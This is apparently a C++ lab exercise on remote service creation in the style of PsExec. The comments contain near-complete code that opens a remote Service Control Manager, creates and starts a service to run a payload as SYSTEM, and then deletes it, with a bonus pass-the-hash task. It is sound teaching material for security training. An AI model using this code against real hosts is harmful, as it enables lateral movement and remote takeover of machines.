/*
  Exercise 03 — Remote Service Creation (PsExec Pattern)
  --------------------------------------------------------
  This is how PsExec works under the hood:
    1. Connect to the remote machine's Service Control Manager over SMB.
    2. Create a service pointing to an executable already on the remote host.
    3. Start the service (runs as SYSTEM on the remote machine).
    4. Clean up (stop and delete the service).

  Prerequisite: your account must be in the remote machine's local
  Administrators group (or you have a valid admin credential/hash).

  In this lab, test against another VM on your network (never a production machine).
  Replace "192.168.1.100" with your lab VM's IP.

  Tasks:
  1. Implement createRemoteService(target, binPath, svcName) — opens the
     remote SCM, creates the service, starts it, and returns success/fail.
  2. Implement deleteRemoteService(target, svcName) — stops and deletes the service.
  3. Build a simple payload: a batch file or .exe that writes a file to
     C:\Windows\Temp\owned.txt (proof of execution).
  4. Run the payload on the remote VM via createRemoteService.
  5. Verify: check that C:\Windows\Temp\owned.txt was created on the remote host.

  BONUS:
  - Use WNetAddConnection2 to authenticate with a specific username/password
    before opening the remote SCM (allows PtH with impersonation).
  - Route the service's output back via a named pipe (how PsExec delivers stdout).

  Compile:
    g++ -std=c++17 -Wall -o ex03.exe ex03_remote_service.cpp -ladvapi32
  Usage:
    ex03.exe <target_ip> <remote_exe_path> <service_name>
    ex03.exe 192.168.1.100 "C:\Windows\Temp\payload.exe" RemoteTestSvc
*/

#include <windows.h>
#include <string>
#include <cstdio>

// ---------- TODO 1: createRemoteService ----------
bool createRemoteService(const std::string& target,
                          const std::string& binPath,
                          const std::string& svcName) {
    // YOUR CODE HERE:
    // SC_HANDLE hScm = OpenSCManagerA(
    //     target.c_str(), SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    // if (!hScm) { printf("[-] OpenSCManager(%s): %lu\n", target.c_str(), GetLastError()); return false; }
    //
    // SC_HANDLE hSvc = CreateServiceA(
    //     hScm, svcName.c_str(), svcName.c_str(),
    //     SERVICE_ALL_ACCESS,
    //     SERVICE_WIN32_OWN_PROCESS,
    //     SERVICE_DEMAND_START,
    //     SERVICE_ERROR_IGNORE,
    //     binPath.c_str(),
    //     nullptr, nullptr, nullptr, nullptr, nullptr);
    //
    // if (!hSvc) {
    //     if (GetLastError() == ERROR_SERVICE_EXISTS) {
    //         hSvc = OpenServiceA(hScm, svcName.c_str(), SERVICE_ALL_ACCESS);
    //     } else {
    //         printf("[-] CreateService: %lu\n", GetLastError());
    //         CloseServiceHandle(hScm); return false;
    //     }
    // }
    //
    // BOOL started = StartServiceA(hSvc, 0, nullptr);
    // if (!started && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
    //     printf("[-] StartService: %lu\n", GetLastError());
    //
    // CloseServiceHandle(hSvc);
    // CloseServiceHandle(hScm);
    // return started || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;

    (void)target; (void)binPath; (void)svcName;
    return false;
}

// ---------- TODO 2: deleteRemoteService ----------
bool deleteRemoteService(const std::string& target, const std::string& svcName) {
    // YOUR CODE HERE:
    // SC_HANDLE hScm = OpenSCManagerA(target.c_str(), nullptr, SC_MANAGER_CONNECT);
    // SC_HANDLE hSvc = OpenServiceA(hScm, svcName.c_str(),
    //                               SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
    //
    // SERVICE_STATUS ss = {};
    // ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
    // // Wait until stopped...
    // DeleteService(hSvc);
    //
    // CloseServiceHandle(hSvc);
    // CloseServiceHandle(hScm);

    (void)target; (void)svcName;
    return false;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: %s <target_ip> <remote_exe_path> <service_name>\n", argv[0]);
        printf("  Example: %s 192.168.1.100 \"C:\\Windows\\Temp\\p.exe\" MySvc\n", argv[0]);
        printf("\n  IMPORTANT: Only use against machines you own/have permission to test.\n");
        return 1;
    }
    const char* target  = argv[1];
    const char* binPath = argv[2];
    const char* svcName = argv[3];

    printf("[*] Target:   %s\n", target);
    printf("[*] Binary:   %s\n", binPath);
    printf("[*] Service:  %s\n", svcName);

    if (createRemoteService(target, binPath, svcName)) {
        printf("[+] Service created and started on %s\n", target);
        printf("[*] Cleaning up...\n");
        deleteRemoteService(target, svcName);
        printf("[+] Service removed\n");
    } else {
        printf("[-] createRemoteService not implemented or failed\n");
    }
    return 0;
}
